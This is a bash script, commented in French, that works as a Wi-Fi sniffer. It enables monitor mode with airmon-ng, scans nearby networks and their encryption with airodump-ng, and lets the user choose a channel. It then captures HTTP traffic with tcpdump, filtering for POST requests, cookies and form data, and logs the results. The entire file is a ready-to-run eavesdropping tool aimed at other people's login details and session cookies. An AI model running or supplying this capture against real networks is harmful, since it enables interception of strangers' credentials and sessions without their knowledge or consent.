#!/bin/bash

# Configuration du logging
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_DIR="$SCRIPT_DIR/logs"
LOG_FILE="$LOG_DIR/wifi_sniffer_all.log"

# Création du dossier logs s'il n'existe pas
mkdir -p "$LOG_DIR"

# Fonction de logging
log() {
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local message="[$timestamp] $1"
    echo "$message" | tee -a "$LOG_FILE"
}

# Nettoyage du fichier de log au démarrage
echo "" > "$LOG_FILE"

# Redirection de stderr vers le fichier de log
exec 2>> "$LOG_FILE"

# Vérifie si aircrack-ng et tcpdump sont installés
for cmd in airmon-ng tcpdump; do
    if ! command -v $cmd &> /dev/null; then
        log "[❌] $cmd n'est pas installé ! Installe-le avec : sudo apt install $cmd"
        exit 1
    fi
done

# Détecte l'interface Wi-Fi
INTERFACE=$(sudo airmon-ng | awk 'NR>2 && $2!="" {print $2; exit}')

if [[ -z "$INTERFACE" ]]; then
    log "[❌] Aucune carte Wi-Fi détectée ! Vérifie ta connexion."
    exit 1
fi

log "[✅] Carte détectée : $INTERFACE"

# Vérifie si l'interface est déjà en mode monitor
if iw dev "$INTERFACE" info | grep -q "type monitor"; then
    log "[✅] L'interface $INTERFACE est déjà en mode monitor."
    MONITOR_INTERFACE="$INTERFACE"
else
    # Active le mode monitor
    sudo airmon-ng start "$INTERFACE"
    MONITOR_INTERFACE="${INTERFACE}mon"
    
    # Vérifie si l'activation a fonctionné
    if ! iw dev "$MONITOR_INTERFACE" info | grep -q "type monitor"; then
        log "[❌] Impossible d'activer le mode monitor sur $INTERFACE."
        exit 1
    fi
    
    log "[✅] Mode monitor activé sur : $MONITOR_INTERFACE"
fi

# Création du dossier captures s'il n'existe pas
CAPTURES_DIR="$SCRIPT_DIR/captures"
mkdir -p "$CAPTURES_DIR"

# Supprime les anciens fichiers de scan
rm -f "$CAPTURES_DIR/networks-"*.csv

# Scan des réseaux Wi-Fi avec `airodump-ng`
log "[🔍] Scan des réseaux Wi-Fi en cours..."
sudo airodump-ng --output-format csv -w "$CAPTURES_DIR/networks" "$MONITOR_INTERFACE" --write-interval 1 > /dev/null 2>&1 &

# Effet de chargement (7 secondes)
log -ne "[🔄] Attente du scan"
for i in {1..7}; do
    log -ne "."
    sleep 1
done
log ""

# Arrêter le scan
sudo pkill airodump-ng

# Vérifie si le fichier de scan a été généré
if [ ! -f "$CAPTURES_DIR/networks-01.csv" ]; then
    log "[❌] Aucun réseau détecté. Vérifie que la carte est bien en mode monitor."
    exit 1
fi

# Afficher les canaux, SSID et type de chiffrement
log "📡 Réseaux détectés :"
awk -F',' '
NR>2 {
    ssid=$14
    canal=$4
    encryption=$6

    # Détection du type de sécurité
    if (encryption ~ /WPA3/) {
        security="WPA3"
    } else if (encryption ~ /WPA2/) {
        security="WPA2"
    } else if (encryption ~ /WPA/) {
        security="WPA"
    } else if (encryption ~ /WEP/) {
        security="WEP"
    } else {
        security="OPEN"
    }

    printf "Canal: %-3s | Sécurité: %-4s | SSID: %s\n", canal, security, ssid
}' "$CAPTURES_DIR/networks-01.csv" | column -t

# Demande à l'utilisateur de choisir un canal
log ""
read -p "📡 Entre le numéro du canal à surveiller : " CANAL

# Bascule la carte Wi-Fi sur le canal choisi
sudo iw dev "$MONITOR_INTERFACE" set channel "$CANAL"
log "[✅] Surveillance du canal $CANAL..."

# Lancer la capture avec tcpdump pour capturer toutes les requêtes POST
log "[📡] Capture en cours... (Appuie sur CTRL+C pour arrêter)"
sudo tcpdump -i "$MONITOR_INTERFACE" -A -s 0 port 80 | grep -E "POST|Host:|User-Agent:|Content-Length:|Content-Type:|Referer:|Cookie:|=|&" | tee "$LOG_DIR/capture.log"

